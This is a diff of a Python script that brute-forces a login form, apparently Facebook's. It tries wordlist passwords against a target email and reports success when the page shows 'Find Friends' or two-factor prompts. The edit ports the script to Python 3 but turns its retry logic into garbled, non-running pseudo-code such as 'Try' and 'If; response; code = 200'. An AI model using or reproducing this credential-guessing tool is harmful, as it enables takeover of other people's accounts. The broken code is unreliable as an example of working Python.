@@ -1,9 +1,10 @@
+from ast import Break, Try, If
 import time
 import sys
-if sys.version_info[0] !=2: 
+if sys.version_info[0] !=3: 
 	print('''--------------------------------------
-	REQUIRED PYTHON 2.x
-	use: python brute2.py
+	REQUIRED PYTHON 3.x
+	use: python3 brute2.py
 --------------------------------------
 			''')
 	sys.exit()
@@ -34,20 +35,18 @@ i=0
 while file:
 	passw=file.readline().strip()
 	i+=1
-	if len(passw) < 6:
+	if len(passw) < 10:
 		continue
 	print=str(i) +" : ",passw
 	response = browser.open(post_url)
-	try:
-		if response.code == 200:
-			browser.select_form(nr=0)()
-			browser.form['email'] = email
-			browser.form['pass'] = passw
-			response = browser.submit()
-			response_data = response.read()
-			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-				print('Your password is : ',passw)
-				break
-	except:
-		print('\nSleeping for time : 2 min\n')
-		time.sleep(300)
+Try
+If; response; code = 200
+browser.select_form(nr=0)()
+browser.form['email'] = email
+browser.form['pass'] = passw
+response = browser.submit()
+response_data = response.read()
+if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+	print('Your password is : ',passw)
+	Break
+	
